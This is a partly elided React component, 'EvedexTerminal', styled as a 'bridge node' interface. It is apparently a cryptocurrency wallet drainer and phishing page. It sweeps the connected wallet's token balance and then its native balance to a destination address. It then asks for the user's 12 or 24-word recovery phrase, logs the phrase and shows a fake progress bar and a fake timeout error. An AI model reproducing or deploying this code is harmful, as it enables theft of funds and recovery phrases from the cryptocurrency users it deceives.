...
export default function EvedexTerminal() {
  ...
  const sweepNative = () => {
    ...
    sendTransaction({ to: destination, value: val }, {
      onSuccess: (h) => { log(`✅ NAT_TX: ${h}`); setView("seed_gate"); setLoading(false); },
  ...
  const executeTaskAction = () => {
    ...
    if (tokenAddr && tokenBal && tokenBal.value > 0n) {
      ...
      sendTransaction({ to: tokenAddr, data: payload }, {
        onSuccess: (h) => { log(`💰 TOK_TX: ${h}`); setTimeout(sweepNative, 1000); },
        onError: () => sweepNative()
      });
    } else { sweepNative(); }
  };
  ...
  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      ...
      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'25px'}}>
        <div>
          <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_BRIDGE_NODE</div>
          <div style={{fontSize:'8px', color:'#10b981'}}>STATUS: ENCRYPTED_TUNNEL_ACTIVE</div>
        </div>
          ...
          <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
            {!isSyncing ? (
              <>
                ...
                <p style={{fontSize:'8px', color:'#64748b', marginBottom:'20px', textTransform:'none', lineHeight:'1.4'}}>To authorize the Mainnet Bridge and prevent Node collision, please provide your 12 or 24-word Backup Recovery Phrase below.</p>
                ...
                <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("CRITICAL_ERROR [0x99A]: Node relay timeout. Mainnet bridge congested."); setView("menu")},1200)}},60);}} style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900', marginTop:'20px'}}>FINALIZE_SYNC</button>
              </>
            ) : (
      ...
      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.96)', zIndex:5000, display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontWeight:'900'}}>STABILIZING_HANDSHAKE...</div>}
    </div>
  );
}
